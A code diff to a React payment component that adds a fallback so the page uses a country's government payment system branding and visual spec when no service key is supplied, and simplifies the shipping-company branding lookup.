@@ -48,17 +48,17 @@ const PaymentData = () => {
   const countryCode = link?.country_code || "SA";
   const govSystem = getGovernmentPaymentSystem(countryCode);
 
+  // Fallback: if no serviceKey, use government payment system by country
+  const effectiveServiceKey = serviceKey || `gov_${countryCode.toLowerCase()}`;
+
   // Get entity visual spec
   const entitySpec = useMemo(() => {
-    if (serviceKey) {
-      return getEntityVisualSpec(serviceKey);
-    }
-    return null;
-  }, [serviceKey]);
+    return getEntityVisualSpec(effectiveServiceKey);
+  }, [effectiveServiceKey]);
 
   // Get branding as fallback
-  const serviceBranding = getServiceBranding(serviceKey);
-  const companyBranding = serviceKey ? shippingCompanyBranding[serviceKey.toLowerCase()] : null;
+  const serviceBranding = getServiceBranding(effectiveServiceKey);
+  const companyBranding = shippingCompanyBranding[effectiveServiceKey.toLowerCase()] || null;
 
   // Apply entity CSS variables
   useEffect(() => {
